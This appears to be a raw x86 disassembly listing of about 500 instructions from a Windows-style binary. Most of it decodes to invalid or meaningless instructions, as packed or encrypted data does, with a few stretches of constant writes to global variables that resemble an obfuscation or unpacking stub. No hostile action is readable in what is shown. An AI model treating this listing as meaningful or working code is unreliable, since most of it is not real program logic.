  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	xchg   ecx,eax
  40d576:	jecxz  0x40d560
  40d578:	mov    bh,0x9c
  40d57a:	stos   DWORD PTR es:[edi],eax
  40d57b:	js     0x40d5f5
  40d57d:	xor    eax,0xe578787e
  40d582:	mov    dl,0x42
  40d584:	add    ebp,edi
  40d586:	repnz dec esp
  40d588:	out    0x9b,al
  40d58a:	inc    edi
  40d58b:	sub    al,0x1d
  40d58d:	cli    
  40d58e:	and    cl,dl
  40d590:	mov    ebp,0x7f10acfc
  40d595:	mov    edi,0x45ed637f
  40d59a:	iret   
  40d59b:	aas    
  40d59c:	stos   DWORD PTR es:[edi],eax
  40d59d:	pop    ds
  40d59e:	inc    esp
  40d59f:	nop
  40d5a0:	add    BYTE PTR [edx+0x11],bh
  40d5a3:	fild   WORD PTR [ebx+0x44]
  40d5a6:	mov    ecx,DWORD PTR [esi-0x3e]
  40d5a9:	pop    esp
  40d5aa:	mov    edi,0x2d66e8d7
  40d5af:	mov    eax,0x2bb1c04f
  40d5b4:	jle    0x40d5ce
  40d5b6:	aam    0x77
  40d5b8:	add    al,0x18
  40d5ba:	in     eax,0xe4
  40d5bc:	stc    
  40d5bd:	sbb    BYTE PTR [eax+0x1b],bl
  40d5c0:	jp     0x40d63f
  40d5c2:	xor    eax,0x2ad2253f
  40d5c7:	cld    
  40d5c8:	jmp    0xa88c821f
  40d5cd:	jmp    0x438dca79
  40d5d2:	add    al,0x27
  40d5d4:	mov    ebx,0xccc88d5d
  40d5d9:	mov    ds:0x6d526d6,eax
  40d5de:	lods   al,BYTE PTR ds:[esi]
  40d5df:	scas   al,BYTE PTR es:[edi]
  40d5e0:	out    dx,eax
  40d5e1:	repnz sbb BYTE PTR [edi],bl
  40d5e4:	inc    esp
  40d5e5:	retf   0xb881
  40d5e8:	stos   DWORD PTR es:[edi],eax
  40d5e9:	sbb    BYTE PTR [eax-0x73],0x9e
  40d5ed:	sbb    al,0x29
  40d5ef:	(bad)  
  40d5f0:	mov    edi,0xa709f33
  40d5f5:	rcl    esp,cl
  40d5f7:	jle    0x40d61a
  40d5f9:	xchg   ecx,eax
  40d5fa:	addr16 inc edx
  40d5fc:	repz xor cl,cl
  40d5ff:	inc    edi
  40d600:	bound  esi,QWORD PTR [edi]
  40d602:	fs int3 
  40d604:	scas   al,BYTE PTR es:[edi]
  40d605:	add    esi,esi
  40d607:	mov    cl,0x73
  40d609:	xchg   edi,eax
  40d60a:	sub    dl,ah
  40d60c:	xor    BYTE PTR [edi+0x53c34b9d],dl
  40d612:	mov    ds:0xa50d3e79,al
  40d617:	stos   BYTE PTR es:[edi],al
  40d618:	pop    ebp
  40d619:	es clc 
  40d61b:	enter  0x58ae,0xbb
  40d61f:	aaa    
  40d620:	mul    BYTE PTR [ecx-0x6e]
  40d623:	sub    esp,DWORD PTR [esi+0x3a18eb54]
  40d629:	inc    ebx
  40d62a:	sbb    al,0x3c
  40d62c:	out    0x98,al
  40d62e:	mov    dh,0xf0
  40d630:	arpl   ax,bp
  40d632:	inc    ebp
  40d633:	clc    
  40d634:	fwait
  40d635:	mov    ah,0x4b
  40d637:	pusha  
  40d638:	mov    dh,BYTE PTR [eax-0x26]
  40d63b:	mov    ebp,0xb4e3cb38
  40d640:	les    edi,FWORD PTR [esi+0x19]
  40d643:	sbb    DWORD PTR gs:[eax],ecx
  40d646:	add    bl,dh
  40d648:	in     eax,dx
  40d649:	xor    DWORD PTR [ecx-0xe],ebx
  40d64c:	ds call 0x9e4e:0x8b290728
  40d654:	mov    ecx,0x38ad9f20
  40d659:	aam    0xc4
  40d65b:	push   ds
  40d65c:	pop    ds
  40d65d:	xchg   dl,bh
  40d65f:	adc    ebx,DWORD PTR [esi-0x3c]
  40d662:	enter  0x68e7,0x27
  40d666:	lods   eax,DWORD PTR ds:[esi]
  40d667:	gs cs retf 0x7b98
  40d66c:	repnz push esp
  40d66e:	lods   eax,DWORD PTR ds:[esi]
  40d66f:	dec    eax
  40d670:	clc    
  40d671:	dec    esp
  40d672:	mov    bl,0xbe
  40d674:	fnstenv [ecx]
  40d676:	test   eax,0x738b3bef
  40d67b:	dec    ebp
  40d67c:	aaa    
  40d67d:	cli    
  40d67e:	xchg   ebx,eax
  40d67f:	jbe    0x40d69f
  40d681:	cwde   
  40d682:	mov    bl,0x8
  40d684:	mov    ch,0x67
  40d686:	bnd ret 
  40d688:	adc    edi,ebx
  40d68a:	mov    ah,0xac
  40d68c:	fdivr  st(7),st
  40d68e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d68f:	into   
  40d690:	jge    0x40d649
  40d692:	das    
  40d693:	iret   
  40d694:	(bad)  
  40d695:	inc    eax
  40d696:	jnp    0x40d693
  40d698:	mov    esp,0x4b342f7d
  40d69d:	out    dx,eax
  40d69e:	mov    ax,ds:0x8b964a68
  40d6a4:	(bad)  
  40d6a5:	das    
  40d6a6:	fcmove st,st(6)
  40d6a8:	jb     0x40d6f7
  40d6aa:	es pop edx
  40d6ac:	dec    ebp
  40d6ad:	jb     0x40d650
  40d6af:	and    BYTE PTR [edi-0x4a50dc66],dh
  40d6b5:	pop    edi
  40d6b6:	cs pop ecx
  40d6b8:	in     al,dx
  40d6b9:	ins    BYTE PTR es:[edi],dx
  40d6ba:	lds    eax,FWORD PTR [edi-0x6f378a8f]
  40d6c0:	or     edi,eax
  40d6c2:	ja     0x40d733
  40d6c4:	out    dx,eax
  40d6c5:	sahf   
  40d6c6:	or     bh,0x81
  40d6c9:	xchg   edx,eax
  40d6ca:	rcl    DWORD PTR [eax],0x4a
  40d6cd:	ins    BYTE PTR es:[edi],dx
  40d6ce:	jp     0x40d6f4
  40d6d0:	cdq    
  40d6d1:	and    al,0x47
  40d6d3:	adc    BYTE PTR [ecx+0xecd95c6],bl
  40d6d9:	inc    ebx
  40d6da:	or     DWORD PTR [ecx],ecx
  40d6dc:	sub    eax,0xd2609b5e
  40d6e1:	shr    ch,cl
  40d6e3:	pusha  
  40d6e4:	push   cs
  40d6e5:	jnp    0x40d6e3
  40d6e7:	jecxz  0x40d66c
  40d6e9:	test   DWORD PTR [edi+esi*1-0x75],0x9171fc27
  40d6f1:	out    dx,eax
  40d6f2:	out    dx,al
  40d6f3:	adc    ebp,DWORD PTR [ebp-0x327cdeb5]
  40d6f9:	jmp    0xec7d:0xc1ee6159
  40d700:	retf   0xddda
  40d703:	ret    0x8831
  40d706:	dec    edi
  40d707:	xchg   ebx,eax
  40d708:	add    eax,0x7146bcb1
  40d70d:	aad    0x1
  40d70f:	ret    0x8d39
  40d712:	adc    BYTE PTR [ebx+0x5bf2bd85],dh
  40d718:	xor    DWORD PTR [edi+0x63d9bd77],esi
  40d71e:	lea    esp,[edx+0x41636d4b]
  40d724:	stos   BYTE PTR es:[edi],al
  40d725:	cs cmp al,0x81
  40d728:	push   ds
  40d729:	ret    0xbd31
  40d72c:	pop    ds
  40d72d:	shr    DWORD PTR ds:0x8b2927f5,1
  40d733:	add    eax,0x12e4c61d
  40d738:	mov    cs,WORD PTR [ecx+0xd]
  40d73b:	inc    edi
  40d73c:	jmp    0x3db4:0x96c6b60b
  40d743:	add    eax,0x11c98a4b
  40d748:	int3   
  40d749:	call   DWORD PTR [eax]
  40d74b:	add    DWORD PTR [eax+0x3c],esp
  40d74e:	pop    esp
  40d74f:	adc    bh,BYTE PTR [ecx]
  40d751:	(bad)  
  40d753:	popa   
  40d754:	sti    
  40d755:	xor    al,0x3
  40d757:	leave  
  40d758:	test   eax,0x6935f521
  40d75d:	pop    ebx
  40d75e:	push   ecx
  40d75f:	int    0x43
  40d761:	or     al,0xf4
  40d763:	idiv   edx
  40d765:	fistp  WORD PTR [ebx-0x5b]
  40d768:	frstor [edi-0x27]
  40d76b:	idiv   edx
  40d76d:	loopne 0x40d774
  40d76f:	mov    ch,0x9e
  40d771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d772:	pop    ecx
  40d773:	pop    ds
  40d774:	pop    ss
  40d775:	dec    eax
  40d776:	adc    al,0xb7
  40d778:	outs   dx,BYTE PTR ds:[esi]
  40d779:	adc    BYTE PTR ds:0x8dc6c4e3,dh
  40d77f:	daa    
  40d780:	mov    dl,0x6f
  40d782:	das    
  40d783:	aam    0xc0
  40d785:	fisubr WORD PTR [ecx+0x6ef23847]
  40d78b:	mov    ah,0x26
  40d78d:	add    BYTE PTR [ebp-0x7ce7d351],bl
  40d793:	jb     0x40d718
  40d795:	mov    es,WORD PTR [ecx+0x5e]
  40d798:	adc    al,BYTE PTR [edi]
  40d79a:	mov    cl,BYTE PTR [edx+edx*8+0x22]
  40d79e:	push   es
  40d79f:	in     eax,0x2b
  40d7a1:	in     eax,dx
  40d7a2:	(bad)  
  40d7a3:	jbe    0x40d747
  40d7a5:	sbb    ebp,DWORD PTR [edx+ebp*2-0x34f11b52]
  40d7ac:	sub    eax,0xfd603e7b
  40d7b1:	jge    0x40d791
  40d7b3:	neg    DWORD PTR [ebx+0x5e]
  40d7b6:	jecxz  0x40d7b6
  40d7b8:	adc    DWORD PTR ds:0xff8174a1,ebp
  40d7be:	cmp    al,0x3
  40d7c0:	add    BYTE PTR [eax],al
  40d7c2:	mov    DWORD PTR ds:0x42a7bd,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42a7c5
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi+0x5b67e45d]
  40d7eb:	repz icebp 
  40d7ed:	pop    ecx
  40d7ee:	test   eax,0x7e357878
  40d7f3:	js     0x40d86d
  40d7f5:	fcom   QWORD PTR [esi+0x1]
  40d7f8:	pop    edx
  40d7f9:	push   esi
  40d7fa:	push   0x30
  40d7fc:	xchg   esp,eax
  40d7fd:	dec    ebp
  40d7fe:	in     eax,0xfe
  40d800:	out    dx,eax
  40d801:	adc    al,0x4
  40d803:	xlat   BYTE PTR ds:[ebx]
  40d804:	add    cl,0x81
  40d807:	xchg   esi,eax
  40d808:	shl    DWORD PTR [eax+ecx*4-0x3a],cl
  40d80c:	jle    0x40d7c0
  40d80e:	test   eax,0x2ccdfc7f
  40d813:	jne    0x40d821
  40d815:	sub    DWORD PTR fs:0x5083174c,eax
  40d81c:	outs   dx,DWORD PTR ds:[esi]
  40d81d:	sar    BYTE PTR [ebx-0x5a6e3049],0x85
  40d824:	je     0x40d835
  40d826:	call   0x430d2eb0
  40d82b:	repnz sub DWORD PTR [edi+edi*2],eax
  40d82f:	ror    DWORD PTR [ebp+ecx*2+0x56],1
  40d833:	into   
  40d834:	and    DWORD PTR [esi-0x1b384762],0x4f
  40d83b:	push   0x1a
  40d83d:	inc    ecx
  40d83e:	hlt    
  40d83f:	popa   
  40d840:	adc    al,0x78
  40d842:	inc    ecx
  40d843:	mov    dh,0xd3
  40d845:	sbb    esp,0xfffffffb
  40d848:	outs   dx,DWORD PTR ds:[esi]
  40d849:	ins    BYTE PTR es:[edi],dx
  40d84a:	jmp    0x40d821
  40d84c:	sub    edi,DWORD PTR [esi]
  40d84e:	hlt    
  40d84f:	ds scas eax,DWORD PTR es:[edi]
  40d851:	mov    eax,0x460d83c1
  40d856:	add    eax,DWORD PTR [edi+0x45]
  40d859:	in     al,0xcd
  40d85b:	mov    eax,0xf9aad227
  40d860:	push   ebx
  40d861:	cwde   
  40d862:	fcmovnbe st,st(7)
  40d864:	xchg   DWORD PTR [edx-0x3f],ecx
  40d867:	mov    esp,0xf19ce164
  40d86c:	fwait
  40d86d:	arpl   WORD PTR [eax+0xf],ax
  40d870:	imul   esi,DWORD PTR [ebx],0xffffff99
  40d873:	ins    BYTE PTR es:[edi],dx
  40d874:	std    
  40d875:	mov    ?,WORD PTR [edx+0x522fe69e]
  40d87b:	cmp    eax,0x8880b639
  40d880:	jno    0x40d87b
  40d882:	mov    ch,0xaa
  40d884:	push   edi
  40d885:	shr    ah,cl
  40d887:	sbb    DWORD PTR [ebp-0x27ca67d9],ebp
  40d88d:	es mov dl,0x85
  40d890:	push   ecx
  40d891:	mov    dh,0x6
  40d893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d894:	repz shr BYTE PTR [edx],0xc7
  40d898:	mov    eax,DWORD PTR [edx+0x55a658f7]
  40d89e:	push   ss
  40d89f:	mov    WORD PTR [ecx],?
  40d8a1:	push   ebp
  40d8a2:	ins    DWORD PTR es:[edi],dx
  40d8a3:	out    0x4f,al
  40d8a5:	xor    al,0x28
  40d8a7:	mov    edx,0x9cf76e4
  40d8ac:	enter  0xac95,0xbd
  40d8b0:	and    DWORD PTR [esp+edx*2],ecx
  40d8b3:	adc    DWORD PTR [edi],eax
  40d8b5:	lods   al,BYTE PTR ds:[esi]
  40d8b6:	jb     0x40d8a5
  40d8b8:	sub    edx,DWORD PTR [ebx+0x51]
  40d8bb:	ds jp  0x40d8af
  40d8be:	mov    al,ds:0x744d4225
  40d8c3:	lea    ecx,[ebx+0x4a34af6e]
  40d8c9:	test   eax,0xfb3640a3
  40d8ce:	xor    BYTE PTR [edx+0x6655bb99],bl
  40d8d4:	es gs int3 
  40d8d7:	std    
  40d8d8:	test   al,0xed
  40d8da:	xchg   edi,eax
  40d8db:	loope  0x40d8ef
  40d8dd:	or     edi,ecx
  40d8df:	dec    edx
  40d8e0:	cmp    dh,ah
  40d8e2:	pop    ecx
  40d8e3:	aam    0x3c
  40d8e5:	loopne 0x40d935
  40d8e7:	lea    ebx,[eax+0x6b]
  40d8ea:	lock jno 0x40d8b8
  40d8ed:	adc    BYTE PTR ds:0x20e4c6e9,0x55
  40d8f4:	mov    ah,0x28
  40d8f6:	jp     0x40d90e
  40d8f8:	fbld   TBYTE PTR [ebx-0x132ab480]
  40d8fe:	(bad)  [eax+0x8e31ae2]
  40d904:	dec    ecx
  40d905:	bound  esp,QWORD PTR [edx+eiz*2]
  40d908:	xchg   ecx,eax
  40d909:	test   al,0xa
  40d90b:	cdq    
  40d90c:	cmp    ebx,DWORD PTR [esi]
  40d90e:	lods   al,BYTE PTR ds:[esi]
  40d90f:	sbb    esi,esi
  40d911:	and    al,0xdc
  40d913:	mov    al,ds:0x228bbe5
  40d918:	gs sbb eax,0xfec036ce
  40d91e:	std    
  40d91f:	(bad)  
  40d921:	and    al,bh
  40d923:	mov    ah,0x1
  40d925:	jle    0x768f8eaf
  40d92b:	cmp    al,0xcf
  40d92d:	(bad)  
  40d92e:	jl     0x40d913
  40d930:	das    
  40d931:	or     BYTE PTR ds:0x5ef2fbd9,cl
  40d937:	call   0x4781d6a4
  40d93c:	lods   al,BYTE PTR ds:[esi]
  40d93d:	test   BYTE PTR [edx-0x5c],al
  40d940:	cli    
  40d941:	stos   DWORD PTR es:[edi],eax
  40d942:	sbb    al,0xd4
  40d944:	out    dx,al
  40d945:	lods   eax,DWORD PTR ds:[esi]
  40d946:	out    0xdd,eax
  40d948:	mov    esp,ebx
  40d94a:	repz adc bh,BYTE PTR [ebp+0x3b]
  40d94e:	and    eax,0x50864f27
  40d953:	outs   dx,BYTE PTR ds:[esi]
  40d954:	mov    dh,0xb0
  40d956:	test   bl,dh
  40d958:	cmp    DWORD PTR [esp+ebp*2],esp
  40d95b:	jnp    0x40d93c
  40d95d:	iret   
  40d95e:	(bad)  
  40d95f:	div    edx
  40d961:	gs sub eax,0x4aceb7ff
  40d967:	aad    0xab
  40d969:	cmp    esi,edi
  40d96b:	(bad)  
  40d96c:	(bad)  
  40d96e:	not    DWORD PTR [edi+0x69c653c5]
  40d974:	push   ebx
  40d975:	push   ds
  40d976:	jge    0x40d9ae
  40d978:	imul   edx,DWORD PTR [edx+0x68a5bfff],0xffffff8a
  40d97f:	add    dl,dl
  40d981:	cmovl  ebx,DWORD PTR [esi]
  40d984:	inc    edx
  40d985:	xor    al,0x9
  40d987:	jnp    0x40d955
  40d989:	push   esi
  40d98a:	loopne 0x40d974
  40d98c:	ss (bad) 
  40d98f:	jmp    0x9c79:0x16b28d62
  40d996:	jg     0x40d92e
  40d998:	inc    edi
  40d999:	or     eax,0xb04bff45
  40d99e:	sub    DWORD PTR [esi-0x21920b29],esi
  40d9a4:	stos   DWORD PTR es:[edi],eax
  40d9a5:	xchg   edi,eax
  40d9a6:	xchg   BYTE PTR [esi],bl
  40d9a8:	xor    ebx,DWORD PTR [esi+0x475aeab6]
  40d9ae:	jg     0x40d953
  40d9b0:	(bad)  
  40d9b1:	rcl    bh,0x20
  40d9b4:	sub    dh,bl
  40d9b6:	mov    WORD PTR [eax+0x5b908c31],ss
  40d9bc:	stc    
  40d9bd:	imul   esp,ebp,0x855f6d87
  40d9c3:	int3   
  40d9c4:	jne    0x40d94c
  40d9c6:	ds int3 
  40d9c8:	mov    ecx,0xc332608e
  40d9cd:	and    ebp,edi
  40d9cf:	cmp    al,0xab
  40d9d1:	ss adc eax,0x2f2a1397
  40d9d7:	jl     0x40d99d
  40d9d9:	cs jmp 0x893b:0x6bd19518
  40d9e1:	cmc    
  40d9e2:	sbb    BYTE PTR [edx],al
  40d9e4:	xchg   ebp,eax
  40d9e5:	mov    al,ds:0xff707bb5
  40d9ea:	scas   eax,DWORD PTR es:[edi]
  40d9eb:	test   BYTE PTR [edx+0x4120ec55],ah
  40d9f1:	dec    edx
  40d9f2:	pop    ss
  40d9f3:	or     BYTE PTR [ebp-0x5bb98716],ah
  40d9f9:	jmp    0x223140d8
  40d9fe:	jg     0x40d9a2
  40da00:	es scas eax,DWORD PTR es:[edi]
  40da02:	add    al,0xea
  40da04:	inc    edi
  40da05:	dec    esp
  40da06:	push   ds
  40da07:	mov    al,0x1a
  40da09:	adc    DWORD PTR [esi-0xdbc16f3],ecx
  40da0f:	cmp    eax,0x497bb3ae
  40da14:	daa    
  40da15:	rcr    BYTE PTR [eax+0x61],0xb1
  40da19:	aaa    
  40da1a:	addr16 cmp eax,0x40de04ef
  40da20:	add    BYTE PTR [esi+ecx*8+0x478568f6],ah
  40da27:	xchg   DWORD PTR [eax+0x52976f77],edx
  40da2d:	jp     0x40da5f
  40da2f:	mov    eax,0x86583
  40da34:	mov    eax,ds:0x42a831
  40da39:	sbb    eax,DWORD PTR ds:0x42a809
  40da3f:	mov    ds:0x42a831,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42a7f1,0x42a7bd
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42a801,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a771,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	xor    BYTE PTR [ebx],cl
  40da7f:	fstp   QWORD PTR [edx+0x7878ae16]
  40da85:	xor    eax,0x1178787e
  40da8a:	and    edx,edx
  40da8c:	ficom  DWORD PTR [edx+0x1ff84846]
  40da92:	(bad)  
  40da93:	mov    al,ds:0xe7047e9e
  40da98:	push   0xffffff8f
  40da9a:	mov    al,ds:0x5824f9d5
  40da9f:	sbb    al,0x7b
  40daa1:	mov    al,ds:0x3bf848e6
  40daa6:	sti    
  40daa7:	mov    edi,DWORD PTR [edi]
  40daa9:	fisttp QWORD PTR [eax+0x61]
  40daac:	outs   dx,DWORD PTR ds:[esi]
  40daad:	aam    0xce
  40daaf:	mov    ebp,0xf40f9792
  40dab4:	jecxz  0x40daa5
  40dab6:	jp     0x40da8b
  40dab8:	retf   
  40dab9:	lods   eax,DWORD PTR ds:[esi]
  40daba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dabb:	and    edi,esi
  40dabd:	in     al,0x37
  40dabf:	pushf  
  40dac0:	push   esp
  40dac1:	or     al,0x31
  40dac3:	or     BYTE PTR [eax-0x1e5f62fa],ch
  40dac9:	arpl   WORD PTR [ebp-0x5121e3a1],bp
  40dacf:	into   
  40dad0:	inc    ebp
  40dad1:	jns    0x40db1c
  40dad3:	xchg   ebx,eax
  40dad4:	in     eax,0xb3
  40dad6:	popf   
  40dad7:	fnsave [ebp+0x6104a387]
  40dadd:	push   ebx
  40dade:	push   0xf6198616
  40dae3:	sub    eax,0xaa0b3f6
  40dae8:	fidiv  WORD PTR [eax-0x34]
  40daeb:	ja     0x40db4f
  40daed:	js     0x40daec
  40daef:	xchg   BYTE PTR [ecx-0x4140b47b],bl
  40daf5:	mov    ch,0x19
  40daf7:	mov    cl,0xa9
  40daf9:	call   0x11b96d63
  40dafe:	fistp  WORD PTR [edx+ebx*2+0x54]
  40db02:	bound  ebp,QWORD PTR [edx+ecx*4+0x407d76bb]
  40db09:	push   ebx
  40db0a:	or     edx,0xf
  40db0d:	add    DWORD PTR ds:0xa4b52def,ecx
  40db13:	jnp    0x40dae8
  40db15:	dec    ecx
  40db16:	add    eax,0x4402d55b
  40db1b:	push   edi
  40db1d:	stos   DWORD PTR es:[edi],eax
  40db1e:	aad    0x3e
  40db20:	shr    ecx,1
  40db22:	mov    dh,BYTE PTR [eax+0x54]
  40db25:	pop    ebp
  40db26:	inc    edi
  40db27:	or     cl,BYTE PTR [ecx-0x203ad6d2]
  40db2d:	cli    
  40db2e:	mov    esp,ss
  40db30:	fadd   DWORD PTR [esi+eiz*4+0x7e989425]
  40db37:	xor    eax,0xa2e5f4d4
  40db3c:	loopne 0x40dba8
  40db3e:	int3   
  40db3f:	lock outs dx,BYTE PTR ds:[esi]
  40db41:	loope  0x40dbaa
  40db43:	jg     0x40db10
  40db45:	xchg   DWORD PTR [edi+0x30],edi
  40db48:	std    
  40db49:	jne    0x40dba5
  40db4b:	sbb    dh,ch
  40db4d:	cmp    esp,DWORD PTR [ebp+0x46a9acfe]
  40db53:	mov    esi,0x1ef00bca
  40db58:	scas   eax,DWORD PTR es:[edi]
  40db59:	unpcklps xmm1,XMMWORD PTR [esi+0x40e4a25f]
  40db60:	jmp    DWORD PTR [edx+0x12890e9]
  40db66:	ins    BYTE PTR es:[edi],dx
  40db67:	lahf   
  40db68:	nop
  40db69:	dec    eax
  40db6a:	jb     0x40db2d
  40db6c:	pop    ebx
  40db6d:	pop    esi
  40db6e:	jge    0x40dbb9
  40db70:	loope  0x40db8e
  40db72:	shr    DWORD PTR [edx],1
  40db74:	repz sub eax,0x535c4e73
  40db7a:	xchg   BYTE PTR [ebx+ebx*4-0x6e],dh
  40db7e:	jg     0x40db12
  40db80:	das    
  40db81:	sbb    ch,cl
  40db83:	cmc    
  40db84:	adc    DWORD PTR [edx+0x70],ebx
  40db87:	add    al,0xb1
  40db89:	mov    ds:0x2878161f,al
  40db8e:	cwde   
  40db8f:	mov    al,ds:0x460d324f
  40db94:	sahf   
  40db95:	or     esi,DWORD PTR [ebx-0x6d4d3e05]
  40db9b:	popf   
  40db9c:	adc    eax,0x3a638f16
  40dba1:	aas    
  40dba2:	sbb    ch,BYTE PTR [edi+0x1e723900]
  40dba8:	inc    edi
  40dba9:	div    ebp
  40dbab:	aam    0x9f
  40dbad:	and    DWORD PTR [ecx-0x77],esi
  40dbb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbb1:	adc    esp,DWORD PTR [ecx+0x58]
  40dbb4:	retf   0x326c
  40dbb7:	add    ch,BYTE PTR [edx+0x2fdb542e]
  40dbbd:	stos   DWORD PTR es:[edi],eax
  40dbbe:	aas    
  40dbbf:	mov    eax,0x5f90eafc
  40dbc4:	dec    ecx
  40dbc5:	xor    BYTE PTR [eax+edx*4],al
  40dbc8:	pushf  
  40dbc9:	aad    0x36
  40dbcb:	add    DWORD PTR [ebx+0x75],ecx
  40dbce:	xchg   edx,eax
  40dbcf:	pop    edi
  40dbd0:	mov    ebp,edi
  40dbd2:	dec    esi
  40dbd3:	add    bh,BYTE PTR [edi-0x7845e89d]
  40dbd9:	inc    edi
  40dbda:	jle    0x40dc08
  40dbdc:	mov    al,ds:0x3c6e2663
  40dbe1:	pop    edx
  40dbe2:	pop    ebx
  40dbe3:	sub    ah,BYTE PTR ds:0xa188db25
  40dbe9:	push   0x8dce3f13
  40dbee:	pushf  
  40dbef:	imul   eax,ebx,0xbd18e420
  40dbf5:	iret   
  40dbf6:	xor    bh,bh
  40dbf8:	mov    esp,0xdc34e15f
  40dbfd:	inc    ebp
  40dbfe:	fbstp  TBYTE PTR [ebp-0x62df9e98]
  40dc04:	push   es
  40dc05:	sbb    DWORD PTR [edx-0x5c],edi
  40dc08:	push   esp
  40dc09:	in     eax,0xd6
  40dc0b:	add    BYTE PTR [ecx+0x30],dh
  40dc0e:	jg     0x40dc11
  40dc10:	cmp    BYTE PTR [edx-0x490e0c5b],dl
  40dc16:	dec    edx
  40dc17:	loop   0x40dc30
  40dc19:	test   DWORD PTR [ecx-0x10104303],ecx
  40dc1f:	mov    dl,0xc6
  40dc21:	or     al,al
  40dc23:	mov    ecx,0xcd30603f
  40dc28:	xor    bl,cl
  40dc2a:	xor    DWORD PTR [eax+0x486dab4d],ebp
  40dc30:	cmp    eax,0xb720d09f
  40dc35:	adc    eax,0x7ecf644c
  40dc3a:	les    edi,FWORD PTR [ebp-0x6493d807]
  40dc40:	push   DWORD PTR [ebx+0x6ad19c3d]
  40dc46:	add    BYTE PTR [ebx+0x71343c3],ah
  40dc4c:	daa    
  40dc4d:	xchg   esp,eax
  40dc4e:	call   esi
  40dc50:	adc    edi,esi
  40dc52:	repz loope 0x40dc7d
  40dc55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc56:	dec    ebp
  40dc57:	sub    eax,0x4404e83e
  40dc5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc5d:	push   edi
  40dc5e:	jl     0x40dc2c
  40dc60:	inc    ebx
  40dc61:	int    0x26
  40dc63:	cwde   
  40dc64:	or     dh,BYTE PTR [ebx-0x2]
  40dc67:	stos   BYTE PTR es:[edi],al
  40dc68:	dec    esi
  40dc69:	cdq    
  40dc6a:	xchg   esi,eax
  40dc6b:	jnp    0x40dbf0
  40dc6d:	sub    esi,esi
  40dc6f:	retf   
  40dc70:	xchg   ch,ah
  40dc72:	adc    al,0xe8
  40dc74:	xor    eax,0x948e2b3d
  40dc79:	xchg   esp,eax
  40dc7a:	push   esi
  40dc7b:	loop   0x40dccf
  40dc7d:	clc    
  40dc7e:	pop    ebp
  40dc7f:	mov    al,ds:0xea558367
  40dc84:	cwde   
  40dc85:	inc    eax
  40dc86:	inc    ebp
  40dc87:	loopne 0x40dc4d
  40dc89:	inc    BYTE PTR [ecx]
  40dc8b:	dec    edx
  40dc8c:	inc    BYTE PTR [eax+0x2884ce28]
  40dc92:	dec    eax
  40dc93:	sahf   
  40dc94:	pop    es
  40dc95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc96:	fdivr  DWORD PTR [esp+esi*8+0x16]
  40dc9a:	xchg   esp,eax
  40dc9b:	in     al,dx
  40dc9c:	xchg   ebx,eax
  40dc9d:	and    al,BYTE PTR [eax+0xa]
  40dca0:	inc    eax
  40dca1:	adc    ebp,esp
  40dca3:	sub    DWORD PTR [edx-0x49],edx
  40dca6:	inc    ebp
  40dca7:	dec    edx
  40dca8:	jne    0x40dccc
  40dcaa:	out    dx,eax
  40dcab:	data16 (bad) 
  40dcad:	jmp    0x40dc31
  40dcaf:	pop    ss
  40dcb0:	push   eax
  40dcb1:	push   ecx
  40dcb2:	fsubrp st(3),st
  40dcb4:	push   es
  40dcb5:	pop    es
  40dcb6:	ins    DWORD PTR es:[edi],dx
  40dcb7:	xchg   ebp,eax
  40dcb8:	loope  0x40dcea
  40dcba:	pop    ss
  40dcbb:	sahf   
  40dcbc:	mov    al,ds:0x59638bdf
  40dcc1:	adc    esi,ebp
  40dcc3:	repnz add eax,DWORD PTR [ebp+0x8]
  40dcc7:	add    DWORD PTR ds:0x42a881,0x296a
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a75d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7b5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a831,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a83d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7b9,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7b1
  40dd3d:	and    DWORD PTR ds:0x42a781,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42a871,0x42a87d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	stos   DWORD PTR es:[edi],eax
  40dd64:	nop
  40dd65:	mov    ah,0xac
